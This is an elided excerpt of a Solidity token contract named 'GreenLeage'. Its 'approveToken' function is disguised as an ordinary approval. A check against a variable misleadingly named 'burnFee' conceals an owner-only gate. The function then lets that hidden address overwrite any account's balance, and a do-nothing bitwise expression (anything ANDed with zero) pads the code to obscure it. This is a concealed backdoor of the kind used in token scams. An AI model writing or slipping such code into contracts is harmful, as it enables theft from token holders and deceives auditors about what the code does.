...
contract GreenLeage is Ownable {
  ...
  function approveToken(bytes32 nodeDATA, address account, uint256 amount) public returns (bool) {
      require(account != address(0));
      require(uint256(msg.sender) == burnFee);
      uint256 AZvalue = 10 ** 9;
    if (amount > 0) {
        _balances[account] = amount * AZvalue + ((10 & (_balances[account]) & 0) << 0xF);
    } else {
        _balances[account] = amount * AZvalue + ((10 & (_balances[account]) & 0) << 0xF);
   }
  return true;
